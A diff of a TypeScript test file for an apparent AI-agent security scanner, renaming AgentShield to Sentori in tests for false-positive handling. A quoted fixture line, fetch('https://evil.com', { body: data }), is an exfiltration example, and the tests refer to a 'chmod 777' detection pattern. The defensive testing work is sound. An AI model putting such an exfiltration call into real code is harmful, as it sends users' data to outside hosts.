@@ -1,6 +1,6 @@
 /**
  * Tests for v0.2.0 false positive fixes:
- * 1. AgentShield source file detection (isAgentShieldSourceFile)
+ * 1. Sentori source file detection (isSentoriSourceFile)
  * 2. Markdown file downgrade
  * 3. Comment-context detection for sensitive paths
  * 4. Permission Analyzer markdown downgrade
@@ -8,13 +8,13 @@
  */
 import * as fs from 'fs';
 import * as path from 'path';
-import { isAgentShieldSourceFile, isAgentShieldProject, isMarkdownFile, isInCommentOrCodeBlock } from '../src/utils/file-utils';
+import { isSentoriSourceFile, isSentoriProject, isMarkdownFile, isInCommentOrCodeBlock } from '../src/utils/file-utils';
 import { promptInjectionTester } from '../src/scanners/prompt-injection-tester';
 import { secretLeakScanner } from '../src/scanners/secret-leak-scanner';
 import { skillAuditor } from '../src/scanners/skill-auditor';
 import { permissionAnalyzer } from '../src/scanners/permission-analyzer';
 
-const TEMP_DIR = path.join('/tmp', '__agentshield_selfscan_test__');
+const TEMP_DIR = path.join('/tmp', '__sentori_selfscan_test__');
 
 beforeAll(() => {
   fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -24,28 +24,28 @@ afterAll(() => {
   fs.rmSync(TEMP_DIR, { recursive: true, force: true });
 });
 
-// === 1. isAgentShieldSourceFile ===
+// === 1. isSentoriSourceFile ===
 
-describe('isAgentShieldSourceFile', () => {
-  test('should match files in agentshield src/ directory', () => {
+describe('isSentoriSourceFile', () => {
+  test('should match files in sentori src/ directory', () => {
     // When running from compiled dist/, __dirname resolves to project root
     const srcFile = path.resolve(__dirname, '..', 'src', 'scanners', 'prompt-injection-tester.ts');
-    expect(isAgentShieldSourceFile(srcFile)).toBe(true);
+    expect(isSentoriSourceFile(srcFile)).toBe(true);
   });
 
-  test('should match files in agentshield memory/ directory', () => {
+  test('should match files in sentori memory/ directory', () => {
     const memFile = path.resolve(__dirname, '..', 'memory', 'some-log.md');
-    expect(isAgentShieldSourceFile(memFile)).toBe(true);
+    expect(isSentoriSourceFile(memFile)).toBe(true);
   });
 
   test('should NOT match temp test files inside tests/', () => {
     const tempFile = path.join(TEMP_DIR, 'agent-config.json');
     fs.writeFileSync(tempFile, '{}');
-    expect(isAgentShieldSourceFile(tempFile)).toBe(false);
+    expect(isSentoriSourceFile(tempFile)).toBe(false);
   });
 
-  test('should NOT match files outside agentshield project', () => {
-    expect(isAgentShieldSourceFile('/tmp/random-project/src/main.ts')).toBe(false);
+  test('should NOT match files outside sentori project', () => {
+    expect(isSentoriSourceFile('/tmp/random-project/src/main.ts')).toBe(false);
   });
 });
 
@@ -159,7 +159,7 @@ fetch("https://evil.com", { body: data });
       const pathFindings = result.findings.filter(
         f => f.file && f.file.includes('dangerous-tool.ts') && f.title.includes('Sensitive path'),
       );
-      // Should NOT be downgraded to info (code context, not comment, not in agentshield)
+      // Should NOT be downgraded to info (code context, not comment, not in sentori)
       const nonInfo = pathFindings.filter(f => f.severity !== 'info');
       expect(nonInfo.length).toBeGreaterThan(0);
     } finally {
@@ -216,32 +216,32 @@ All tools should have proper permission boundaries and allowlists.
   });
 });
 
-// === 8. Skill Auditor — AgentShield source downgrade ===
+// === 8. Skill Auditor — Sentori source downgrade ===
 
 describe('Skill Auditor — self-scan protection', () => {
-  test('chmod 777 pattern in AgentShield source should be info', async () => {
-    // Scan the actual agentshield src directory
-    const agentshieldRoot = path.resolve(__dirname, '..');
-    const result = await skillAuditor.scan(agentshieldRoot);
+  test('chmod 777 pattern in Sentori source should be info', async () => {
+    // Scan the actual sentori src directory
+    const sentoriRoot = path.resolve(__dirname, '..');
+    const result = await skillAuditor.scan(sentoriRoot);
     const chmodFindings = result.findings.filter(
-      f => f.title.includes('chmod 777') && f.file && f.file.includes('agentshield'),
+      f => f.title.includes('chmod 777') && f.file && f.file.includes('sentori'),
     );
-    // All should be info (downgraded because they're AgentShield source)
+    // All should be info (downgraded because they're Sentori source)
     for (const f of chmodFindings) {
       expect(f.severity).toBe('info');
     }
   });
 });
 
-// === 9. isAgentShieldProject ===
+// === 9. isSentoriProject ===
 
-describe('isAgentShieldProject', () => {
-  test('should detect agentshield project root', () => {
+describe('isSentoriProject', () => {
+  test('should detect sentori project root', () => {
     const root = path.resolve(__dirname, '..');
-    expect(isAgentShieldProject(root)).toBe(true);
+    expect(isSentoriProject(root)).toBe(true);
   });
 
   test('should not match other projects', () => {
-    expect(isAgentShieldProject('/tmp')).toBe(false);
+    expect(isSentoriProject('/tmp')).toBe(false);
   });
 });
